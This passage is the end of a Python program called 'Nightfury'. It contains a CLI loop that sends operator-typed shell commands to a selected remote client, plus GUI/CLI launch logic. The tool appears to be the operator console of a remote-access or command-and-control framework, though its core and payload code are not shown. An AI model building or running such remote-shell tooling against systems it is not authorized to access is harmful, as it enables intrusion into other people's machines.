        self.log(f"Interacting with {self.selected_client}. Type 'exit' to return to menu.", "info")
        
        try:
            while True:
                cmd = Prompt.ask(f"({self.selected_client}) $")
                if cmd.lower() == 'exit':
                    self.selected_client = None
                    break
                if cmd:
                    self.core.send_shell_command(self.selected_client, cmd)
                    time.sleep(0.5) # Give time for data to come back
        except KeyboardInterrupt:
            self.log("Interaction stopped.", "warning")
            self.selected_client = None

# ===============================================
# SECTION 4: MAIN EXECUTION & FALLBACK LOGIC
# ===============================================

def is_display_available():
    """Checks if a GUI environment is available."""
    if not PYQT_AVAILABLE:
        return False
        
    # Check for $DISPLAY on Unix-like systems
    if os.environ.get('DISPLAY', False):
        try:
            # Try to initialize QApplication. This is the definitive test.
            app = QApplication.instance() or QApplication(sys.argv)
            # We don't need to run app.exec_(), just see if it initializes
            return True
        except Exception as e:
            # This will catch 'Qt.qpa.xcb: could not connect to display'
            logger.warning(f"GUI check failed: {e}")
            return False
            
    # Check for Windows
    if platform.system() == "Windows":
        return True # Windows always has a display (unless it's Nano Server)

    return False

if __name__ == "__main__":
    # --- Dependency Check ---
    if not PYQT_AVAILABLE:
        print("[FATAL] PyQt5 is required for this framework, even for CLI mode (due to core components).")
        print("Please run: pip install PyQt5")
        sys.exit(1)
        
    if not RICH_AVAILABLE:
        print("[FATAL] 'rich' is required for the CLI fallback.")
        print("Please run: pip install rich")
        sys.exit(1)

    # --- Environment Check & Launch ---
    if is_display_available():
        # --- LAUNCH GUI MODE ---
        app = QApplication.instance() or QApplication(sys.argv)
        core = NightfuryCore()
        window = NightfuryGUI(core)
        window.show()
        sys.exit(app.exec_())
    else:
        # --- LAUNCH CLI MODE ---
        print("[Nightfury Core] No GUI display detected. Falling back to Command-Line Interface.")
        core = NightfuryCore()
        cli = NightfuryCLI(core, Console())
        cli.run()